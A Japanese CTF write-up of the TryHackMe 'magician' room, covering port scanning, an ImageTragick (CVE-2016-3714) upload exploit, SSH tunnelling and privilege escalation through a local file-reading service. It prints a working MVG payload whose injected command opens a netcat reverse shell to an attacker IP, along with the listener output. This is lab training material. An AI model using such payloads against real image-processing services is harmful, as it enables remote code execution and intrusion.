# magician CTF

https://tryhackme.com/room/magician

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.144.55
root@ip-10-10-229-247:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-02 07:08 BST
Nmap scan report for 10.10.144.55
Host is up (0.00019s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap
MAC Address: 02:39:1D:9D:BB:FD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.36 seconds
root@ip-10-10-229-247:~# sudo nmap -sV -p21,8080,8081 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-02 07:08 BST
Nmap scan report for 10.10.144.55
Host is up (0.00014s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.0.8 or later
8080/tcp open  http-proxy
8081/tcp open  http       nginx 1.14.0 (Ubuntu)
```

#### 8080

```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Wed Apr 02 06:09:26 UTC 2025
There was an unexpected error (type=Not Found, status=404).
No message available
```

#### 8081

- png を jpg に変換するコンバーター。PNG をアップロードできる。
- コンバーターの javascript で 8080 にアクセスしている。
- php の先頭を PNG マジックナンバーに変えたらアップロードできるが、PHP ファイルがダウンロードされるだけで実行はされなかった。

### FTP

Anonymous ログイン時のメッセージ

```shell
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
```

https://imagetragick.com/　・・・ CVE-2016–3714 の説明

PayloadsAllTheThings に png でリバースシェルのペイロードがあった。

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20ImageMagick/imagetragik1_payload_imageover_reverse_shell_netcat_fifo.png

IP, port だけ設定してアップロード。

```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|mkfifo /tmp/gjdpez; nc 10.2.22.182 4444 0</tmp/gjdpez | /bin/sh >/tmp/gjdpez 2>&1; rm /tmp/gjdpez '
pop graphic-context
pop graphic-context
```

リバースシェル取得成功

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.144.55] 39596
id
uid=1000(magician) gid=1000(magician) groups=1000(magician)
```

```shell
cat /home/magician/user.txt
THM{s..................}
```

## 権限昇格

```shell
magician@magician:~$ cat the_magic_continues
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```

ローカルで Listen していることを示唆している。

```shell
magician@magician:~$ netstat -plt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:tproxy          0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:6666          0.0.0.0:*               LISTEN      -
tcp6       0      0 [::]:http-alt           [::]:*                  LISTEN      1303/java
tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      -
```

6666 ポートを wget してみたら、index.html が保存された。

```shell
magician@magician:~$ wget http://localhost:6666
--2025-04-02 03:40:26--  http://localhost:6666/
Resolving localhost (localhost)... 127.0.0.1
Connecting to localhost (localhost)|127.0.0.1|:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2851 (2.8K) [text/html]
Saving to: ‘index.html’

index.html          100%[===================>]   2.78K  --.-KB/s    in 0s

2025-04-02 03:40:26 (29.0 MB/s) - ‘index.html’ saved [2851/2851]
```

index.html

```html
<!DOCTYPE html>
<html>
  <head>
    <title>The Magic cat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Bootstrap -->
    <link
      href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="navbar navbar-inverse" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">The Magic cat</a>
        </div>
      </div>
    </div>

    <div class="container">
      <form action="" method="post" class="form" role="form">
        <div class="form-group ">
          <label class="control-label" for="filename">Enter filename</label>

          <input
            class="form-control"
            id="filename"
            name="filename"
            type="text"
            value=""
          />
        </div>

        <input
          class="btn btn-default"
          id="submit"
          name="submit"
          type="submit"
          value="Submit"
        />
      </form>
      <div>
        <span>
          <pre class="page-header">
        

        ░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
        ░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
        ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
        ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
        ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
        █░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
        █░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
        ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
        ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
        ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
        ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
        ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
        ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
        ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
        ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
        
        
        </pre
          >
        </span>
      </div>
    </div>

    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </body>
</html>
```

ファイル名をサブミットする画面ということが分かる。kali 側から接続したい。

### SSH トンネリング

[トンネリング](/トンネリング.md) 参照

```shell
magician@magician:~$ ssh -N -R 6666:localhost:6666 tunnel@10.2.22.182
```

kali のブラウザから、http://localhost:6666 でアクセスできるようになる。

ファイル名のテキストボックスに `/root/root.txt` を入れサブミットすると、フラグのような形式の文字列が出てくる。これを ROT13 するとフラグになる。

```
GUZ{........................}
```

## 振り返り

- 今後は、PayloadsAllTheThings を基本のツールボックスに取り入れたい。
- SSH トンネリングは「ハッキングしてる感」があって気持ちいい。
- ImageTragick の脆弱性に少し言及すると、内部的に convert コマンドを使用しており、mvg ファイル等の中にコマンドの記述があると実行されてしまうという話。

```shell
convert exploit.mvg out.png
```
